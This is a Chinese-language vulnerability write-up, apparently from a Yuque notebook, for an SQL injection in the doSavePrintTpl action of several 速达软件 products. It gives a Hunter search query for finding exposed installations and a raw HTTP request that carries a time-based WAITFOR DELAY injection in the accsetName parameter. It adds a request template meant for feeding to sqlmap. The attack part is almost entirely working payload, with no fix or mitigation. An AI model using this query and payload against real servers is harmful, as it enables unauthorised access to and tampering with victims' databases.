# 速达软件技术（广州）有限公司多款产品doSavePrintTpl存在SQL注入漏洞

# 一、漏洞简介
速达软件技术（广州）有限公司多款产品doSavePrintTpl存在SQL注入漏洞

# 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

# 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征

![1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5.png](./img/Si9C0gSG68Sdjyok/1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5-608754.png)

![1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae.png](./img/Si9C0gSG68Sdjyok/1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae-495074.png)

# 四、漏洞复现
```plain
GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&modId=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB
Upgrade-Insecure-Requests: 1
```

![1705074370016-a37fced7-17fc-4b64-aab5-352671640d38.png](./img/Si9C0gSG68Sdjyok/1705074370016-a37fced7-17fc-4b64-aab5-352671640d38-736967.png)

sqlmap

```plain
GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1&modId=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB
Upgrade-Insecure-Requests: 1
```

![1705074401317-a2a6a0cf-f844-4f08-83f7-8af83f6a4834.png](./img/Si9C0gSG68Sdjyok/1705074401317-a2a6a0cf-f844-4f08-83f7-8af83f6a4834-074768.png)



> 更新: 2024-02-29 23:55:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/giuash5tw64if5lo>